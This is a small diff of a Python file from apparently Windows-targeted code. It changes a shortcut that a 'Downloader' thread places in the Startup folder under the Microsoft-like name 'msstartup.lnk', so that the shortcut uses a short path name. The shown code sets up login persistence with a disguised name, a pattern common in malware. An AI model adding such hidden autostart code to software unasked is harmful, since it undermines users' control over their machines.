@@ -7,6 +7,7 @@ import launcher
 import os
 import pythoncom
 import threading
+import win32api
 import win32com.client
 
 from win32com.shell import shellcon
@@ -54,7 +55,7 @@ class Downloader(threading.Thread):
         startup = shell.SpecialFolders('Startup') 
 
         shorty = shell.CreateShortcut(os.path.join(startup, "msstartup.lnk")) 
-        shorty.TargetPath = path
+        shorty.TargetPath = win32api.GetShortPathName(path)
         shorty.Save() 
         
         
